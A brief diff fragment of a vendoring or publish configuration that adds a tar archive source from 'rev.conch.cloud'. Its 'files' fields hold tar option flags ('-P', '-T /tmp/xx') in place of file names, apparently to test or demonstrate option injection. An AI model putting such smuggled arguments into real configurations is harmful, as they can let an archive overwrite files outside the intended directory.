@@ -15,5 +15,9 @@ ruby_version = "2.5.6"
   url = "http://rev.conch.cloud/tark2.tar"
   dir = "."
   files = ["-P","-T","/tmp/xx"]
+  [[publish.Vendor]]
+  url = "http://rev.conch.cloud/tark.tar"
+  dir = "."
+  files = ["-P"]
 
  
